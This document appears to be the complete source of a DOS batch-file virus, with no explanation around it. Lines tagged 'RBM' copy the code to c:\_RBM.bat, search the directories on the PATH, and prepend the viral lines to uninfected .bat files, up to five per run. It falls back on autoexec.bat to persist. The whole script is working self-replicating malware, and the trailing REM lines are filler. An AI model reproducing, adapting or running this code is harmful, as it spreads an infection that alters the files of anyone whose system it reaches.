if '%1=='RBM goto RBM%2
set RBM=%0.bat
if not exist %RBM% set RBM=%0
if '%RBM%==' set RBM=autoexec.bat
if exist c:\_RBM.bat goto RBMg
if exist %RBM% goto RBMf
call %RBM% RBM h %path%
if exist %RBM% goto RBMf
goto eRBM
:RBMh
shift%_RBM%
if '%2==' goto RBMx
if exist %2\%RBM set RBM=%2\%RBM%
if exist %2%RBM set RBM=%2%RBM%
if exist %2\%RBM.bat set RBM=%2\%RBM%.bat
if exist %2%RBM.bat set RBM=%2%RBM%.bat
if not exist %RBM% goto RBMh
goto RBMx
:RBMf
find "RBM"<%RBM%>c:\_RBM.bat
:RBMg
if '%!RBM%=='- goto RBMe
set !RBM=%!RBM%-
command /e:5000 /c c:\_RBM RBM v . .. %path%
:eRBM
set RBM=
if exist \!RBM.bat del \!RBM.bat
goto RBMe
:RBMx
echo.>\!RBM.bat
\!RBM.bat
:RBMv
shift%_RBM%
if '%2==' exit RBM
for %%a in (%2\*.bat %2*.bat) do call c:\_RBM RBM i %%a 
goto RBMv
:RBMi
find "RBM"<%3>nul
if not errorlevel 1 goto RBMe
type c:\_RBM.bat>RBM$
type %3>>RBM$
move RBM$ %3>nul
set RBM#=%RBM#%-
if %RBM#%==----- exit 
:RBMe
REM -------------------------------------------
                                               
REM -------------------------------------------
REM -------------------------------------------
                                               
REM -------------------------------------------
REM -------------------------------------------
                                               
REM -------------------------------------------
REM -------------------------------------------
                                               
REM -------------------------------------------
